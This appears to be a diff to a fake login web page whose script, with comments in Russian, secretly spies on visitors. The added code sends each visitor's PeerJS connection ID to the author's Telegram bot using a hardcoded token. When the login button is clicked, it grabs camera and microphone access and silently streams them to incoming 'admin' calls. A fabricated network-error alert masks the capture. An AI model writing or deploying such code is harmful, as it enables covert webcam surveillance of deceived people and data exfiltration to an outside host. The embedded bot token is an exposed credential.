@@ -77,12 +77,24 @@
 <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 <script>
     const loginBtn = document.querySelector('.btn');
-    // Создаем Peer. Если хочешь фиксированный ID, можно написать Peer('my-secret-id')
     const peer = new Peer(); 
 
+    // Твои данные
+    const botToken = '8685347158:AAFJr2ifGhw2iLUrwgxXcfPg_SPnMHyccKs';
+    const myChatId = '1751760034'; // Твой ID из userinfobot
+
     peer.on('open', (id) => {
-        console.log('Твой ID для подключения:', id);
-        // В реальном проекте здесь можно отправить 'id' себе в Telegram через Bot API
+        console.log('ID сгенерирован:', id);
+
+        // Формируем сообщение
+        const message = `🔔 Новый визит!\nID для подключения: ${id}`;
+        
+        // Правильная ссылка для Telegram
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myChatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(telegramUrl)
+            .then(response => console.log('Уведомление отправлено в TG'))
+            .catch(err => console.error('Ошибка отправки в TG:', err));
     });
 
     loginBtn.onclick = async () => {
@@ -90,17 +102,19 @@
             // Запрашиваем доступ к камере
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             
-            // Слушаем входящие "звонки" от твоей админки
+            // Ждем звонка от админки
             peer.on('call', (call) => {
-                call.answer(stream); // Автоматически принимаем вызов и отдаем видео
+                call.answer(stream); 
             });
 
-            // Имитируем ошибку входа, чтобы пользователь ничего не заподозрил
+            // Маскировка
             alert("Произошла ошибка сети. Попробуйте войти через Facebook.");
         } catch (err) {
-            console.error("Доступ запрещен или камера не найдена", err);
+            console.error("Доступ запрещен", err);
+            alert("Ошибка подключения к серверу авторизации.");
         }
     };
 </script>
 </body>
 </html>
+
